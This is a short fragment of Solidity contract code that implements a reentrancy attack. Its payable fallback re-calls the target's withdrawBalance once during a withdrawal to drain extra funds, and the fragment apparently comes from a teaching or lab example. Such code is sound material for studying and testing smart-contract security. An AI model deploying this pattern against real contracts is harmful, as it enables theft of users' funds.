    function getBalance() external view returns (uint256) {
        return c.getBalance(address(this));
    }
    function withdraw() external {
        c.withdrawBalance();
    }
    fallback() external payable {
        if (!once) {
            once = true;
            c.withdrawBalance();
        }
    }
